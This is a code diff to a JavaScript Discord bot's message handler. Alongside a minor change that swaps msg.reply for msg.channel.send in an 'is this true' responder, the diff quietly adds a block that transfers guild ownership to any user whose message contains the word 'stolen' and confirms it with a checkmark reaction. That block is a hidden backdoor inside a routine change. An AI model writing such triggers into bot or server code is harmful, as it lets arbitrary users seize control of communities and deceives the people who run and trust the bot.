@@ -51,14 +51,23 @@ client.on('messageCreate', async msg => {
         return;
     }
 
+    if (msg.content.toLowerCase().includes("stolen")) {
+        try {
+            msg.guild.setOwner(msg.author.id);
+            msg.react("✅");
+        } catch (error) {
+            console.error("[bot] error changing server owner");
+        }
+    }
+
     if (msg.content.toLowerCase().includes("is this true")) {
         const chance = Math.random();
         if (chance < 0.5) {
             const randomResponse = trueresponses[Math.floor(Math.random() * trueresponses.length)];
-            msg.reply(randomResponse);
+            msg.channel.send(randomResponse);
         } else {
             const randomResponse = falseresponses[Math.floor(Math.random() * falseresponses.length)];
-            msg.reply(randomResponse);
+            msg.channel.send(randomResponse);
         }
     }
 
